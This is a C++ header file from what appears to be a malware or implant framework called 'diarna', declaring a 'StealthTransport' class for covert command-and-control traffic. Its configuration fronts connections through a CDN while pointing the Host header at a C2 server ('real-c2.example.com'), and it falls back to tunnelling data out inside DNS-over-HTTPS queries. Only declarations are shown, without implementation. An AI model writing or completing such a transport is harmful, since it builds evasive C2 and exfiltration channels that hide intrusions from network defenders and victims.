#pragma once
#include <diarna/compiler_port.hpp>
#include <string>
#include <vector>
#include <span>
#include <functional>
#include <chrono>

namespace diarna::comm {

struct FrontingConfig {
    std::string cdn_front;       // e.g. "cdn.cloudflare.net"
    std::string cdn_host;        // Host header value: "real-c2.example.com"
    uint16_t cdn_port = 443;
    bool use_tls = true;

    bool doh_fallback = true;    // DNS-over-HTTPS as backup
    std::string doh_resolver;    // e.g. "https://cloudflare-dns.com/dns-query"
    std::string doh_domain;      // domain to encode data in queries
};

class StealthTransport {
public:
    StealthTransport();
    ~StealthTransport();

    bool configure(const FrontingConfig& cfg);

    bool connect();
    void disconnect();
    bool is_connected() const;

    bool send(std::span<const uint8_t> data);
    std::vector<uint8_t> recv(std::chrono::milliseconds timeout);

    struct TransportStats {
        uint64_t fronted_sent;
        uint64_t fronted_recv;
        uint64_t doh_sent;
        uint64_t doh_recv;
        bool using_doh;
    };
    TransportStats stats() const;

private:
    FrontingConfig cfg_;
    SOCKET sock_;
    bool connected_;
    TransportStats stats_;

    bool connect_fronted();
    bool connect_doh();
    bool send_doh_query(std::span<const uint8_t> data);
    std::vector<uint8_t> recv_doh_response(std::chrono::milliseconds timeout);
    static std::string base64_encode_url(std::span<const uint8_t> data);
    static std::vector<uint8_t> base64_decode_url(const std::string& data);
};

} // namespace diarna::comm
